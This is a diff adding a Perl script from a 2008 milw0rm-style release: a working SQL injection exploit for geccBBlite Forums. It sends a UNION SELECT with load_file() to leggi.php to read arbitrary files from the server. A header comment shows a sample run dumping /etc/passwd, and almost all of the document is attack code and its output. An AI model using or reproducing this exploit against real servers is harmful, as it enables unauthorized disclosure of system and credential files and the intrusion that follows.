@@ -1,0 +1,103 @@
+#!/usr/bin/perl
+################################
+##    Coded by Piker [piker(dot)ther00t(at)gmail(dot)com]
+##      D.O.M Team
+## piker,ka0x,an0de,xarnuz
+## 2008 Security Researchers
+################################
+##
+## geccBBlite Forums SQL Injection Exploit
+##
+##   This exploit tries to read an
+##   arbitrary file.
+##
+################################
+
+# piker@domlabs:~/advisories$ perl geccBB.pl http://localhost/geccBB /etc/passwd
+#[+] Prefix: geccBB_
+#[+] File HEX: 0x2f6574632f706173737764
+#[+] Host: http://localhost/geccBB/
+#[+] File content:
+#daemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/#bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/#shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/#bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/#gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shdhcp:x:100:101::/nonexistent:/bin/falsesyslog:x:101:102::/home/syslog:/bin/#falseklog:x:102:103::/home/klog:/bin/falsemessagebus:x:103:109::/var/run/dbus:/bin/falsehplip:x:104:7:HPLIP system user,,,:/var/run/hplip:/bin/falseavahi-#autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falseavahi:x:106:114:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/#falsehaldaemon:x:107:116:Hardware abstraction layer,,,:/home/haldaemon:/bin/falsegdm:x:108:118:Gnome Display Manager:/var/lib/gdm:/bin/#falsepiker:x:1000:1000:piker,,,,:/home/piker:/bin/bashlibuuid:x:109:120::/var/lib/libuuid:/bin/shpulse:x:110:121:PulseAudio daemon,,,:/var/run/pulse:/bin/#falsepolkituser:x:111:125:PolicyKit,,,:/var/run/PolicyKit:/bin/falsemysql:x:112:127:MySQL Server,,,:/var/lib/mysql:/bin/falseuml-net:x:113:129::/home/uml-#net:/bin/falsesshd:x:114:65534::/var/run/sshd:/usr/sbin/#nologinpostfix:x:115:130::/var/spool/postfix:/bin/false
+#[+] EOF
+#
+#
+
+
+use LWP::UserAgent;
+
+open(FILE, ">&STDOUT");
+
+my $host = $ARGV[0];
+my $file = $ARGV[1];
+my $prefix = "geccBB_";
+if (length($ARGV[2]) > 0){ $prefix = $ARGV[2]; }
+
+die &_USO unless $ARGV[1];
+
+sub _USO
+{
+    die "
+    geccBBlite Forums SQL Injection Exploit
+
+    This exploit tries to read an
+    arbitrary file.
+   
+    usage: ./$0 <host> <file_you_want> [prefix: default geccBB_]
+    ex: ./$0 http://localhost/geccBB/ /etc/passwd
+
+    ";
+}
+
+my $ua = LWP::UserAgent->new() or die;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
+
+my $tmp="0x";
+my $tmp2;
+
+print FILE "[+] Prefix: ".$prefix."\n";
+
+foreach my $c (split(//, $file)){
+    $tmp2 = sprintf ("%x", ord($c));
+    $tmp .= $tmp2;
+}
+
+print FILE "[+] File HEX: ".$tmp."\n";
+
+if ($host !~ /\/$/){ $host .= "/"; }
+
+print FILE "[+] Host: ".$host."\n";
+
+my $req = HTTP::Request->new(GET => $host."leggi.php?id=-1 union all select 1,2,3,CONCAT(0x3c46494c453e,load_file(".$tmp."),0x3c46494c453e),5,6 from ".$prefix."forum");
+my $res = $ua->request($req);
+my $con = $res->content;
+
+my $ok = 0;
+
+if ($res->is_success){
+    foreach my $linea (split(/\n/, $con)){
+        if($ok == 1){
+            if ($linea !~ /<FILE>/){
+                print FILE $linea;
+            }else{
+                print FILE "\n[+] EOF\n";
+                goto salida;
+            }
+        }
+        if($linea =~ /<FILE>/i && $ok == 0){
+            $ok = 1;
+            print FILE "[+] File content: \n";
+        }
+    }
+    salida:
+    if ($ok == 0){
+        print FILE "[-] Exploit Failed!";
+    }       
+}
+else{
+    print FILE "[-] Exploit Failed!";
+}
+
+#EOF
+
+# milw0rm.com [2008-10-05]
